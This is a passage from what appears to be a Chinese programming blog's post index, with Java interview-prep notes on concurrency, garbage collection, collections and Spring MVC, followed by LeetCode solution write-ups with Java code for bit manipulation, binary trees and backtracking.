如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载 优点 避免类的重复加载，父加载器加载后子类不会再加载。 安全，核心API无法被替换 多线程 线程概览 线程状态 1234new -&gt; ready -&gt; running -&gt; exit | | | | -&gt;blocked-| Thread 重要方法 start() 开始执行 stop() 强行停止（过时，不要使用） join() 等待线程结束 synchronized 和 lock Lock是一个接口，而synchronized是Java中的关键字，synchronized是内置的语言实现； synchronized在发生异常时，会自动释放线程占有的锁，因此不会导致死锁现象发生；而Lock在发生异常时，如果没有主动通过unLock()去释放锁，则很可能造成死锁现象，因此使用Lock时需要在finally块中释放锁； Lock可以让等待锁的线程响应中断，而synchronized却不行，使用synchronized时，等待的线程会一直等待下去，不能够响应中断； 通过Lock可以知道有没有成功获取锁，而synchronized却无法办到。 Lock可以提高多个线程进行读操作的效率。（可以通过readwritelock实现读写分离） 性能上来说，在资源竞争不激烈的情形下，Lock性能稍微比synchronized差点（编译程序通常会尽可能的进行优化synchronized）。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。 线程池 原因：线程过短，频繁创建线程浪费时间 ThreadPoolExecuter 重要参数： corePoolSize 核心池大小，可以预先创建，如果thread数量达到，则吧新任务放入缓存队列。 maximumPoolSize 线程池最大线程数 keepAliveTime 没有任务时多长时间终止 workQueue 阻塞队列，存储等待执行的任务 新提交一个任务时的处理流程： 如果当前线程池的线程数还没有达到基本大小 (poolSize &lt; corePoolSize)，无论是否有空闲的线程新增一个线程处理新提交的任务； 如果当前线程池的线程数大于或等于基本大小 (poolSize &gt;= corePoolSize) 且任务队列未满时，就将新提交的任务提交到阻塞队列排队，等候处理workQueue.offer(command)； 如果当前线程池的线程数大于或等于基本大小 (poolSize &gt;= corePoolSize) 且任务队列满时； 当前 poolSize&lt;maximumPoolSize，那么就新增线程来处理任务； 当前 poolSize=maximumPoolSize，那么意味着线程池的处理能力已经达到了极限，此时需要拒绝新增加的任务。至于如何拒绝处理新增的任务，取决于线程池的饱和策略RejectedExecutionHandler。 使用 共有4种线程池,都通过ExecutorService pool = Executors. newXXXThreadExecutor();来创建 newCachedThreadPool 可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。 newFixedThreadPool 定长线程池 newScheduledThreadPool 支持定时任务的定长线程池 newSingleThreadPool 单线程线程池 CAS (Compare and swap) CAS中有三个操作数，内存对象v，预计原值A，新值B。 在对A进行赋值时，先判断原来的值是否为A，如果为A那么就把新值B赋值到V对象上，如果原本的值不是A，则不赋值。 缺点 自循环时间长，开销大，CPU敏感，如果又很多线程想要修改同一变量，会不停的自循环，浪费CPU周期 只能保证一个变量的原子操作，不能保证一个代码块 ABA问题 变量由A变为了B，但是在检查之前又变为了A 可以通过添加一个版本戳来记录变化，在java中是AtomicStampedReference AtomicInteger AtomicInteger类是一个支持原子操作的Integer类，通过CAS实现原子操作。内部使用了一个死循环，如果CAS不成功就一直重试，直到成功。 AtomicInteger用法 12345public final int get() //获取当前的值public final int getAndSet(int newValue)//获取当前的值，并设置新的值public final int getAndIncrement()//获取当前的值，并自增public final int getAndDecrement() //获取当前的值，并自减public final int getAndAdd(int delta) //获取当前的值，并加上预期的值 进程间通信 1. 管道（Pipe）： 管道是一种半双工的通信方式，数据只能单向流动，而且只能在具有亲缘关系进程间的通信，允许一个进程和另一个与它有共同祖先的进程之间进行通信。 Java中并不提供创建管道文件的方法，因此在linux系统中我们可以使用 mkfifo 命令来创建一个管道文件。然后再Java中就可以将管道文件当作一个普通文件进行输出。 2. 信号（Signal）： 信号是比较复杂的通信方式，用于通知接受进程有某种事件发生。不常用 3. 消息（Message）队列： 消息队列是消息的链接表。有足够权限的进程可以向队列中添加消息，被赋予读权限的进程则可以读走队列中的消息。消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺点。 3. 套接字（Socket）： 更为一般的进程间通信机制，与其他通信机制不同的是，它可用于不同及其间的进程通信。可用于不同机器之间的进程间通信。 Java 垃圾回收 Java 中的引用 强引用 Object obj = new Object() 大多数引用 软引用，可能还有用但是非必须，回收一次后不够会回收这些。 弱引用，只能生存到下次GC之前 虚引用，无法通过其获得实例，只会再被回收时收到通知。 如何判断是否为垃圾 1. 引用计数法（未使用） 堆中每个对象（不是引用）都有一个引用计数器。当一个对象被创建并初始化赋值后，该变量计数设置为1。每当有一个地方引用它时，计数器值就加1（a = b， b被引用，则b引用的对象计数+1）。当引用失效时（一个对象的某个引用超过了生命周期（出作用域后）或者被设置为一个新值时），计数器值就减1。任何引用计数为0的对象可以被当作垃圾收集。当一个对象被垃圾收集时，它引用的任何对象计数减1。 2. 根搜索法 通过一系列名为“GC Roots”的对象作为起始点，寻找对应的引用节点。 找到这些引用节点后，从这些节点开始向下继续寻找它们的引用节点。 重复（2）。 搜索所走过的路径称为引用链，当一个对象到GC Roots没有任何引用链相连时，就证明此对象是不可用的。 如何清理垃圾 标记清除算法 标记-清除算法分为标记和清除两个阶段。该算法首先从根集合进行扫描，对存活的对象对象标记，标记完毕后，再扫描整个空间中未被标记的对象并进行回收 效率不高 产生碎片 标记整理算法 把不是垃圾的向前移动，清除边界以外的内存，缺点是GC的暂停时间会加长，因为拷贝耗时 Copying 算法 把内存分为两块，每次一块的使用完了，就把还存活的复制到另一块上。 分代收集算法 在下面说明 对象在堆中的存储 分为三个区域 1. 新生代 Young Generation 几乎所有新生成的对象首先都是放在年轻代的。新生代内存按照8:1:1的比例分为一个Eden区和两个Survivor(Survivor0,Survivor1)区。大部分对象在Eden区中生成。 GC过程会将Eden中的存活放置在S0 S0满了把Eden和S0复制到S1,然后清空Eden和S0，S1复制到S0. 没经过一次GC，对象的年龄+1，满15岁直接进老年区 一般用copy算法 2. 年老代（Old Generation） 大对象直接去老年代，老年代满了会Full GC 标记清除、标记整理 3. 持久代 Permanent Generation Java垃圾回收器 1. Serial收集器 基于复制算法的新生代收集器 JDK 1.3之前是唯一选择 进行垃圾收集时必须暂停所有工作线程 2. ParNew收集器 Serial收集器的多线程版本，也是新生代收集器 可以与CMS垃圾回收一起使用 3. Parallel Scavenge收集器 是一个并行（无需暂停工作线程）的多线程新生代收集器，复制算法，目标是达到一个可控制的吞吐量。 提供了一个参数UseAdaptiveSizePolicy，虚拟机会动态调整新生代大小，eden区和survival区的比例以提供最合适的停顿时间或者最大的吞吐量 无法与CMS共同使用 Serial Old收集器 Serial收集器的老年代版本，使用标记整理算法 JDK 1.5之前，若新生代开启Parallel Scavenge，则老年代只能使用这种算法。 Parallel Old 收集器 是 Parallel Scavenge 收集器的老年代版本，多线程并使用标记整理算法。 CMS 收集器 以获取最短回收停帧时间为目标，使用标记清除算法，老年代收集器 CMS回收期分为一下4个步骤 初始标记：标记GC root能够直接关联的对象，需要停帧 并发标记：进行GC root tracing，耗时最长 重新标记：为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段稍长一些，但远比并发标记的时间短。此阶段也需要“Stop The World”。 并发清除 但是CMS也有缺点 CPU资源敏感 无法处理回收过程中又产生的新垃圾 空间碎片 G1 收集器 并行与并发，缩短停帧时间 分代收集，但是可以独立管理一个堆 不会产生空间碎片 可以预测停帧时间 G1收集器相比于其他收集器有着与众不同的特点 横跨整个堆，把堆分划为大小相等的region，新生代老年代不再需要物理隔离，而是分布于不同的region（无需连续） 建立可预测的时间模型，G1跟踪各个Region里面的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），在后台维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的Region。 避免全堆扫描——Remembered Set。虚拟机为G1中每个Region维护了一个与之对应的Remembered Set。虚拟机发现程序在对Reference类型的数据进行写操作时，会产生一个Write Barrier暂时中断写操作，检查Reference引用的对象是否处于不同的Region之中（在分代的例子中就是检查是否老年代中的对象引用了新生代中的对象），如果是，便通过CardTable把相关引用信息记录到被引用对象所属的Region的Remembered Set之中。当进行内存回收时，在GC根节点的枚举范围中加入Remembered Set即可保证不对全堆扫描也不会有遗漏。 Java 数据结构 ArrayList 如果ArrayList的大小已经不满足需求时，那么就将数组变为原长度的1.5倍，之后的操作就是把老的数组拷到新的数组里面 线程不安全 LinkedList 双向链表，搜索时会判断前半区间还是后半区间 线程不安全 HashMap Java的HashMap为拉链式HashMap，使用数组存放元素，遇到哈希冲突则以链表的形式接在数组元素的后面。对于新插入的数据HashMap会对新数据的HashCode取模，结果则为index。但是计算机中取模的代价远高于位运算，因此HashMap要求数组长度必须为2^n，因为HashCode &amp; 2^(n-1) = HashCode % 2^n 当HashMap中的元素数量超过Capacity * LoadFactor时，则需要进行扩容，创建一个原来Capacity两倍的数组，把原本的元素全部重新移动到新数组中。多线程会造成冲突 ConcurrentHashMap JDK 1.8 之前 JDK1.8之前的concurrentHashMao是基于分段锁，将HashCode的前sshift位作为Segment的index，segment继承于ReentrantLock,读操作不使用锁，使用的是UNSAFE.getObjectVolatile()，而读操作则需要获取分段锁。 JDK 1.8 基于CAS CAS写入，失败synchronize ThreadLocal ThreadLocal 是一个用来创建线程局部变量的类，只能被创建他的线程所使用。 123456// 创建ThreadLocal&lt;T&gt; mVariableThreadLocal = new ThreadLocal&lt;&gt;()// setmVariableThreadLocal.set()//value// getmVariableThreadLocal.get() 原理 首先想到的是每一个ThreadLocal都在内部维护一个map，Key 为Thread，value为在该Thread中的实例，但是这会造成一定的问题 增加或减少线程需要修改map，因此该map需要线程安全，需要锁。 线程结束需要保证该线程访问的所有ThreadLocal中对应的键值被删除，否则会导致内存泄露。 因此，与其让ThreadLocal来维护这个map，我们不如让每个thread来维护自己的map，每个Thread都有一个threadLocalMap的字段，由thread维护ThreadLocal与具体对象的映射 12345678910111213public T get() &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) &#123; ThreadLocalMap.Entry e = map.getEntry(this); if (e != null) &#123; @SuppressWarnings(&quot;unchecked&quot;) T result = (T)e.value; return result; &#125; &#125; return setInitialValue();&#125; 对于已经不再被使用且已经回收的ThreadLocal对象，ThreadLocal的Key为弱引用，GC的时候会被清除，但是value则是强引用，无法被回收。因此会把所有键是null的键值对的值也设置为null，用于防止内存泄漏。 红黑树，B 树， B+树 B树（多路平衡查找树） 所有节点关键字递增排列，左小右大 叶子节点树n, 1&lt;n&lt;=M (M&gt;=2) 所有叶子节点都在同一层 B+树 是B树的升级版，速度接近于二分查找 非叶子节点不保留值 每一个叶子节点会保留下一个叶子节点的指针 相比与B树 树的层级更少，因为非叶子节点不存储值本身，可以储存更多条目 查询速度更稳定。必须都要查询到叶子节点 天然排序，全节点遍历更加快速，只需要沿着叶子节点构成的链表遍历即可 但是若经常访问的节点层级较低，则B树更快 红黑树 保证O(logn)的时间复杂度 Spring Servlet Servlet 本质上是知识Java中规定的一种接口，他包含5个方法： 1234567public interface Servlet &#123; void init(ServletConfig var1) throws ServletException; ServletConfig getServletConfig(); void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException; String getServletInfo(); void destroy();&#125; 这些方法包括了Servlet重要的生命周期函数 init() 和 destroy, 定义了这个Servlet在初始化和销毁时应该做出的行为，此外还有一个 service() 函数来定义收到请求时要做什么。 单独的Servlet是无法独自工作的，因此我们需要Servlet容器，Tomcat就是我们所熟知的Servlet容器，当Tomcat接收到请求时，会决定将请求交由哪个Servlet来处理，并调用该Servlet的 service() 方法，生成 Response 后再返回请求方。 SpringMVC 请求流程 用户向服务器发送请求 获取Filter调用链，调用doFilter进行过滤 请求被Spring 前端控制DispatcherServlet捕获； DispatcherServlet对请求URL进行解析，得到请求资源标识符（URI）。然后根据该URI，调用HandlerMapping获得该Handler配置的所有相关的对象（包括Handler对象以及Handler对象对应的拦截器），最后以HandlerExecutionChain对象的形式返回； DispatcherServlet 根据获得的Handler，选择一个合适的HandlerAdapter。（附注：如果成功获得HandlerAdapter后，此时将开始执行拦截器的preHandler(…)方法） 提取Request中的模型数据，填充Handler入参，开始执行Handler（Controller)。 在填充Handler的入参过程中，根据你的配置，Spring将帮你做一些额外的工作： HttpMessageConveter： 将请求消息（如Json、xml等数据）转换成一个对象，将对象转换为指定的响应信息数据转换：对请求消息进行数据转换。如String转换成Integer、Double等数据根式化：对请求消息进行数据格式化。 如将字符串转换成格式化数字或格式化日期等数据验证： 验证数据的有效性（长度、格式等），验证结果存储到BindingResult或Error中. Handler执行完成后，向DispatcherServlet 返回一个ModelAndView对象； 根据返回的ModelAndView，选择一个适合的ViewResolver（必须是已经注册到Spring容器中的ViewResolver)返回给DispatcherServlet ； ViewResolver 结合Model和View，来渲染视图 将渲染结果返回给客户端。","categories":[{"name":"面试","slug":"面试","permalink":"https://virgilchen97.github.io/categories/%E9%9D%A2%E8%AF%95/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://virgilchen97.github.io/tags/Java/"}]},{"title":"1111.有效括号的嵌套深度","slug":"1111-有效括号的嵌套深度","date":"2020-03-31T10:53:08.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/03/1111-有效括号的嵌套深度/","link":"","permalink":"https://virgilchen97.github.io/2020/03/1111-%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%B5%8C%E5%A5%97%E6%B7%B1%E5%BA%A6/","excerpt":"有效括号字符串 仅由 “(” 和 “)” 构成，并符合下述几个条件之一： 空字符串 连接，可以记作 AB（A 与 B 连接），其中 A 和 B 都是有效括号字符串 嵌套，可以记作 (A)，其中 A 是有效括号字符串 类似地，我们可以定义任意有效括号字符串 s 的 嵌套深度 depth(S)： s 为空时，depth(&quot;&quot;) = 0 s 为 A 与 B 连接时，depth(A + B) = max(depth(A), depth(B))，其中 A 和 B 都是有效括号字符串 s 为嵌套情况，depth(&quot;(&quot; + A + “)”) = 1 + depth(A)，其中 A 是有效括号字符串 例如：&quot;&quot;，&quot;()()&quot;，和 “()(()())” 都是有效括号字符串，嵌套深度分别为 0，1，2，而 “)(” 和 “(()” 都不是有效括号字符串。 给你一个有效括号字符串 seq，将其分成两个不相交的子序列 A 和 B，且 A 和 B 满足有效括号字符串的定义（注意：A.length + B.length = seq.length）。 现在，你需要从中选出 任意 一组有效括号字符串 A 和 B，使 max(depth(A), depth(B)) 的可能取值最小。 返回长度为 seq.length 答案数组 answer ，选择 A 还是 B 的编码规则是：如果 seq[i] 是 A 的一部分，那么 answer[i] = 0。否则，answer[i] = 1。即便有多个满足要求的答案存在，你也只需返回 一个。 12345678示例 1：输入：seq = &quot;(()())&quot;输出：[0,1,1,1,1,0]示例 2：输入：seq = &quot;()(())()&quot;输出：[0,0,0,1,1,0,1,1]","text":"有效括号字符串 仅由 “(” 和 “)” 构成，并符合下述几个条件之一： 空字符串 连接，可以记作 AB（A 与 B 连接），其中 A 和 B 都是有效括号字符串 嵌套，可以记作 (A)，其中 A 是有效括号字符串 类似地，我们可以定义任意有效括号字符串 s 的 嵌套深度 depth(S)： s 为空时，depth(&quot;&quot;) = 0 s 为 A 与 B 连接时，depth(A + B) = max(depth(A), depth(B))，其中 A 和 B 都是有效括号字符串 s 为嵌套情况，depth(&quot;(&quot; + A + “)”) = 1 + depth(A)，其中 A 是有效括号字符串 例如：&quot;&quot;，&quot;()()&quot;，和 “()(()())” 都是有效括号字符串，嵌套深度分别为 0，1，2，而 “)(” 和 “(()” 都不是有效括号字符串。 给你一个有效括号字符串 seq，将其分成两个不相交的子序列 A 和 B，且 A 和 B 满足有效括号字符串的定义（注意：A.length + B.length = seq.length）。 现在，你需要从中选出 任意 一组有效括号字符串 A 和 B，使 max(depth(A), depth(B)) 的可能取值最小。 返回长度为 seq.length 答案数组 answer ，选择 A 还是 B 的编码规则是：如果 seq[i] 是 A 的一部分，那么 answer[i] = 0。否则，answer[i] = 1。即便有多个满足要求的答案存在，你也只需返回 一个。 12345678示例 1：输入：seq = &quot;(()())&quot;输出：[0,1,1,1,1,0]示例 2：输入：seq = &quot;()(())()&quot;输出：[0,0,0,1,1,0,1,1] 解法 题目中提到给定的括号字符串一定是合法的 为了让A和B的maxDepth最小，我们可以用一个栈来监视当前括号的深度，将深度平均分给A和B，具体的来说就是把奇数层的括号分给A, 把偶数层的分给B. 1234567891011121314151617181920212223242526class Solution &#123; public int[] maxDepthAfterSplit(String seq) &#123; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); int res[] = new int[seq.length()]; char a[] = seq.toCharArray(); for (int i = 0; i &lt; seq.length(); i++) &#123; // 左括号，入栈，代表深度+1 if (a[i] == &#x27;(&#x27;) &#123; stack.push(i); &#125; else &#123; // 遇到右括号，此时栈的大小就代表括号的深度 if (stack.size() % 2 == 0) &#123; // 偶数层分给B res[stack.pop()] = 1; res[i] = 1; &#125; else &#123; // 奇数层分给A res[stack.pop()] = 0; res[i] = 0; &#125; &#125; &#125; return res; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[]},{"title":"只出现n次的数字总结","slug":"出现一次的数字","date":"2019-09-20T09:11:56.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/09/出现一次的数字/","link":"","permalink":"https://virgilchen97.github.io/2019/09/%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/","excerpt":"给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。 说明： 你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？ 例子 12345输入: [2,2,1]输出: 1输入: [4,1,2,1,2]输出: 4","text":"给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。 说明： 你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？ 例子 12345输入: [2,2,1]输出: 1输入: [4,1,2,1,2]输出: 4 解法 本题使用位运算的思路，利用异或运算来解决，异或运算有以下特征： 任何数自身的异或都为 0 任何数异或 0 结果都是自身 我们发现本题中只有一个数出现了一次，而其他数都出现了两次，我们可以对给的数组中的所有数进行异或，所有出现两次的数异或后都成为了 0，而只出现一次的数异或 0 获得了本身，因此结果正好为只出现一次的数。 代码 123456789class Solution &#123; public int singleNumber(int[] nums) &#123; int res = 0; for (int i = 0; i &lt; nums.length; i++) &#123; res ^= nums[i]; &#125; return res; &#125;&#125; 137. 只出现一次的数字 II 题目 给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现了三次。找出那个只出现了一次的元素。 说明： 你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？ 例子 12345输入: [2,2,3,2]输出: 3输入: [0,1,0,1,0,1,99]输出: 99 解法 本题的解法思路与136题类似，在136题中我们使用异或运算使得相同的两个数运算的结果为0，在本题中，我们需要思考的问题是，我们是否能够定义一种运算（代替异或），使得三个数运算的结果为 0 呢？ 答案是肯定的，在这里我们使用一种数字电路设计的思路来设计。 重新回到本题，我们的目标是使得三个数的运算结果为 0。你会发现三进制不计进位的加法恰好符合我们的要求：三个1相加结果为0。因此我们需要设计一个三进制的计数器。 首先，三进制需要2个bit来表示（00，01，10，11），因此我们用 one 和 two 这两个变量分别存放我们的 2 个 bit。因为我们要求的是三进制，因此我们只需要 00, 01, 10 这三个状态，首先我们列出状态转移方程： one two num newOne newTwo 0 0 1 0 1 0 1 1 1 0 1 0 1 0 0 0 0 0 0 0 0 1 0 0 1 1 0 0 1 0 这个表格的意思是，当下一个数的对应bit为1时，one和two的值会进入下一个状态，例如，当one和two都为0时，下一个数对应bit的值为1，那么one和two就会变为他们的下一个状态01，one，two会经历00-&gt;01-&gt;10-&gt;00的循环。 接下来，我们需要通过状态转移表来得出newOne 和 one，two，num以及newTwo和one，two，num直接的逻辑关系。为了简化这种逻辑推断的复杂度，我们使用卡诺图来做，首先画出newOne的卡诺图： num/one，two 00 01 11 10 0 1 我们先画出这样一张空表，顶排的 00，01，11，10代表one当前bit和two当前bit的真或者假，左侧的0，1代表num目前bit的真或假，根据状态转移方程填表： num/one，two 00 01 11 10 0 0 0 X 1 1 0 1 X 0 因为我们的表中没有 11 这一项（不需要）因此填入X，代表这一位的真假我们并不关心。接下来在卡诺图上画圈，画圈的具体规则是： 区域必须是长方形（正方形） 卡诺图上下左右是联通的 区域内只能包含1或X 区域的大小必须是2的幂（2，4，8……） 每个区域尽可能地大 画完后不能有1在区域外 因此我们得出的结果是： 然后我们便可以通过圈来得出newOne 和 one，two，num直接的逻辑关系。首先我们观察上方的圈，圈住的区域one一直为真，而two则真假都有，说明其值并不影响，同时num一直为假，因此我们得出这个圈代表的逻辑是：one &amp; ~num。 同理，我们可以得出下方的圈代表的逻辑是：two &amp; num, 将这些圈或起来，我们得出：newOne = (one &amp; ~num) | (two &amp; num)。使用相同的方法，我们也可以得出：newTwo = (~one &amp; ~two &amp; num) | (two &amp; ~num)。 这样我们就创造出了我们新的运算，代码就很简单啦： 代码 123456789101112class Solution &#123; public int singleNumber(int[] nums) &#123; int one = 0, two = 0, temp = 0; for (int num : nums) &#123; temp = (two &amp; num) | (one &amp; ~num); two = (~one &amp; ~two &amp; num) | (two &amp; ~num); one = temp; &#125; return two; // 这里return two的原因是第二个状态为 01，one 为 0，two 为 1 &#125;&#125;","categories":[],"tags":[{"name":"位运算","slug":"位运算","permalink":"https://virgilchen97.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"}]},{"title":"116-填充每个节点右侧指针","slug":"16-填充每个节点的下一个右侧节点指针","date":"2019-09-14T09:11:56.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/09/16-填充每个节点的下一个右侧节点指针/","link":"","permalink":"https://virgilchen97.github.io/2019/09/16-%E5%A1%AB%E5%85%85%E6%AF%8F%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E5%8F%B3%E4%BE%A7%E8%8A%82%E7%82%B9%E6%8C%87%E9%92%88/","excerpt":"给定一个完全二叉树，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下： 123456struct Node &#123; int val; Node *left; Node *right; Node *next;&#125; 填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。 初始状态下，所有 next 指针都被设置为 NULL。 提示： 你只能使用常量级额外空间。 使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。","text":"给定一个完全二叉树，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下： 123456struct Node &#123; int val; Node *left; Node *right; Node *next;&#125; 填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。 初始状态下，所有 next 指针都被设置为 NULL。 提示： 你只能使用常量级额外空间。 使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。 解法 1. BFS 非常数额外空间 通过BFS连接每一层的节点，需要额外耗费 O(n) (一个队列) 的空间 123456789101112131415161718192021222324252627class Solution &#123; public Node connect(Node root) &#123; if(root == null)&#123; return root; &#125; Queue&lt;Node&gt; queue = new LinkedList&lt;&gt;(); queue.offer(root); while(!queue.isEmpty())&#123; Node prev = null; int thisLevel = queue.size(); for(int i = 0; i &lt; thisLevel; i++)&#123; Node now = queue.poll(); if(prev!=null)&#123; prev.next = now; &#125; prev = now; if(now.left != null)&#123; queue.offer(now.left); &#125; if(now.right != null)&#123; queue.offer(now.right); &#125; &#125; &#125; return root; &#125;&#125; 2. 拉拉链解法 这种方法通过递归，从上向下连接所有相邻的但是不属于同一子树的节点，直接说起来有点复杂，举例： 首先从节点1开始，新建 left = 1.left, right = 1.right 连接left和right left = left.right, right = right.left，两侧向中间靠拢 循环直至left为null 以上操作讲 1 这个节点下方的相邻节点全部连接了起来，再在left和right上进行递归，便可以填充所有的next。 1234567891011121314151617class Solution &#123; public Node connect(Node root) &#123; if(root == null)&#123; return root; &#125; Node left = root.left; Node right = root.right; while(left != null)&#123; left.next = right; left = left.right; right = right.left; &#125; connect(root.left); connect(root.right); return root; &#125;&#125;","categories":[],"tags":[{"name":"二叉树","slug":"二叉树","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"排列问题总结","slug":"6-47-78-90-排列问题总结","date":"2019-08-29T09:11:56.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/08/6-47-78-90-排列问题总结/","link":"","permalink":"https://virgilchen97.github.io/2019/08/6-47-78-90-%E6%8E%92%E5%88%97%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/","excerpt":"一个排列组合问题的简单总结","text":"一个排列组合问题的简单总结 排列问题总结 (回溯法) 46. 全排列 题目 给定一个没有重复数字的序列，返回其所有可能的全排列。 例子 12345678910输入: [1,2,3]输出:[ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1]] 解法 本题使用回溯法，遍历所有可能的子集，并添加到结果，具体细节看代码 1234567891011121314151617181920212223242526272829class Solution &#123; List&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;&gt;(); // 存放结果 public List&lt;List&lt;Integer&gt;&gt; permute(int[] nums) &#123; generate(new ArrayList&lt;&gt;(), nums, new boolean[nums.length]); return res; &#125; public void generate(List&lt;Integer&gt; now, int[] nums, boolean[] usage)&#123; //如果当前序列的长度达到了原数组的长度，代表找出了一个结果 if(now.size() == nums.length)&#123; // 由于从头到尾使用的都是同一个ArrayList实例，这里添加要创建一个新的实例，不然结果会被修改 res.add(new ArrayList(now)); return; &#125; for(int i = 0; i &lt;nums.length; i++)&#123; // 当前的数没被使用过 if(!usage[i])&#123; now.add(nums[i]); usage[i] = true; // 递归生成下一位 generate(now, nums, usage); // 回溯前要撤销之前的操作 usage[i] = false; now.remove(now.size() - 1); &#125; &#125; &#125;&#125; 78. 子集 题目 给定一组不含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。 解法 本题实际思路与 46 题比较类似，区别在于不需要等到当前结果长度等于数组长度的时候才将结果加入结果集。 同时由于子集的顺序是无所谓的，因此 Usage 数组也可以删去，同时保证每一层选中的数都在上一层选中的数之后即可。 123456789101112131415161718192021class Solution &#123; List&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;&gt;(); public List&lt;List&lt;Integer&gt;&gt; subsets(int[] nums) &#123; generate(new ArrayList&lt;&gt;(), 0, nums); return res; &#125; public void generate(List&lt;Integer&gt; now, int start, int[] nums)&#123; // 每次都把结果加入结果集 res.add(new ArrayList&lt;&gt;(now)); if(now.size() &gt; nums.length)&#123; return; &#125; // 这里的start是上一层选中的数的位置，为了保证选中的数在上一层选中的数的位置之后，循环从 start 开始 for(int i= start; i &lt; nums.length; i++)&#123; now.add(nums[i]); generate(now, i + 1, nums); now.remove(now.size() - 1); &#125; &#125;&#125; 47. 全排列 II 给定一个可包含重复数字的序列，返回所有不重复的全排列。 解法 本题和第46题的区别在于，序列中会包含重复数字，直接沿用46题的方法会产生重复的排列结果，因此在生成序列的时候需要进行剪枝。 根据某大神的题解，剪枝的条件是： 在同一层，该分支不是第一个分支 当前分支选出的数和前一分支选出的数相等 同一层前一个分支选出的数在本分支还没有被使用 以上条件成立的前提是输入的数组是有序数组，因此需要对数组进行排序。 1234567891011121314151617181920212223242526272829303132// 代码整体变换不大，仅需要添加排序和剪枝class Solution &#123; List&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;&gt;(); public List&lt;List&lt;Integer&gt;&gt; permuteUnique(int[] nums) &#123; // 排序保证规则有效 Arrays.sort(nums); generate(new ArrayList&lt;&gt;(), nums, new boolean[nums.length]); return res; &#125; public void generate(List&lt;Integer&gt; now, int[] nums, boolean[] usage)&#123; if(now.size() == nums.length)&#123; res.add(new ArrayList(now)); return; &#125; for(int i = 0; i &lt;nums.length; i++)&#123; if(!usage[i])&#123; // 剪枝 // i &gt; 0 保证不是第一个分支 // nums[i] == nums[-1] 保证当前分支选出的数和前一分支选出的数相等 // !usage[i-1] 保证同一层前一个分支选出的数在本分支还没有被使用/ if(i &gt; 0 &amp;&amp; nums[i] == nums[i-1] &amp;&amp; !usage[i-1])&#123; continue; &#125; now.add(nums[i]); usage[i] = true; generate(now, nums, usage); usage[i] = false; now.remove(now.size() - 1); &#125; &#125; &#125;&#125; 90. 子集 II 给定一个可能包含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。 解法 和子集相比多出了重复的元素，因此我们需要添加去重的步骤。 123456789101112131415161718192021class Solution &#123; List&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;&gt;(); public List&lt;List&lt;Integer&gt;&gt; subsetsWithDup(int[] nums) &#123; Arrays.sort(nums); generate(new ArrayList&lt;&gt;(), nums, 0); return res; &#125; public void generate(List&lt;Integer&gt; now, int[] nums,int start)&#123; res.add(new ArrayList(now)); for(int i = start; i &lt;nums.length; i++)&#123; // 剪枝 if(i &gt; start &amp;&amp; nums[i] == nums[i-1])&#123; continue; &#125; now.add(nums[i]); generate(now, nums ,i+1); now.remove(now.size() - 1); &#125; 